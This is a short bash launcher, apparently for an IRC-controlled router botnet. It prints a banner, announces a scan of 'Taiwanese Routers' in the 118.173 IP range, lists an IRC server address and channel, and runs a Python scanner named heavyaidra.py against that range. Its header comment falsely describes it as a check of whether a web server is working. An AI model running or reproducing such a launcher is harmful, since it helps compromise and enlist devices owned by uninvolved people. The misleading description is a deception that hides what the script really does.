#!/bin/bash
#This script is designed to tell you if your web server is working properly.
#Copyright @ 2016; Black Network Service
#https://www.blacknet.xyz

# Text indication shortcut
bold=$(tput bold)
normal=$(tput sgr0)

# Color text shortcut
red='\033[0;31m'
green='\033[0;32m'
blue='\033[0;34m'
br='\033[0;31;1m'
yellow='\033[1;33m'
white='\033[1;37m'

# Ascii Art Logo
cat "blacknetwork.txt"

# Welcome Message
echo -e "${yellow}Now starting scan for Taiwanese Routers..."
echo -e "Scanning IP range 118.173"
echo -e "IRC Server: 185.61.138.156 Channel: #kek${normal}"

echo -e "${green}" 
python heavyaidra.py 376 B 118.173 1
echo -e "${normal}"